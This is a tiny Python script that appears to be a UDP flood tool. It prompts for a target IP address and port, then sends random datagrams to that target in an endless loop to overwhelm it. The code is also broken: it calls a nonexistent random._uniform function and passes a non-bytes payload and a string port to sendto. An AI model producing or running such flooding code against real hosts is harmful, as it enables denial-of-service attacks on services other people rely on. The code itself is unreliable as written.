import socket
import random
s = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
k = random._uniform(1024)
ip = input("İp:")
port = input("port:")
while True:
    s.sendto(k,(ip,port))
  

    
